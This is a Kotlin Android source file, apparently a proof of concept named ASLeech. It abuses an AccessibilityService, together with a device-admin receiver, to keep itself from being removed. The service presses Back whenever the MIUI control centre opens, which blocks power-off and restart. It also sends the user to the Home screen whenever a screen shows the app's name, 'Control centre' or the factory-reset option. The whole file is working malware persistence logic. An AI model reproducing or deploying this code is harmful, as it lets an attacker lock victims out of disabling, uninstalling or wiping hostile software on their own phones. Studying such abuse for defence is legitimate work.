package com.noobexon.asleech

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent


class ASLeechDeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
    }
}
class ASLeech : AccessibilityService() {
    private val tag = "ASLeech"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // Blocks Power off and restart with Control Center
        if (event.packageName == "miui.systemui.plugin") {
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val rootNode: AccessibilityNodeInfo? = rootInActiveWindow
            rootNode?.let { root ->
                // logViewHierarchy(root, 0)
                findAndPerformAction(root)
            }
        }
    }

    override fun onInterrupt() {}

    private fun findAndPerformAction(nodeInfo: AccessibilityNodeInfo): Boolean {
        val blockedTexts = listOf(
            "Control centre",
            "ASLeech",
            "Erase all data (factory reset)"
        )

        for (text in blockedTexts){
            if (nodeInfo.findAccessibilityNodeInfosByText(text).isNotEmpty()){
                performGlobalAction(GLOBAL_ACTION_HOME)
                return true
            }
        }
        return false
    }



    // logViewHierarchy() is only used to understand the view of each window, but is not needed for the actual logic.
//    private fun logViewHierarchy(nodeInfo: AccessibilityNodeInfo, depth: Int) {
//        val prefix = "  ".repeat(depth)
//        val description = buildString {
//            append(prefix)
//            append(nodeInfo.toString())
//        }
//
//        Log.d(tag, description)
//
//        for (i in 0 until nodeInfo.childCount) {
//            val child = nodeInfo.getChild(i)
//            child?.let {
//                logViewHierarchy(it, depth + 1)
//            }
//        }
//    }



}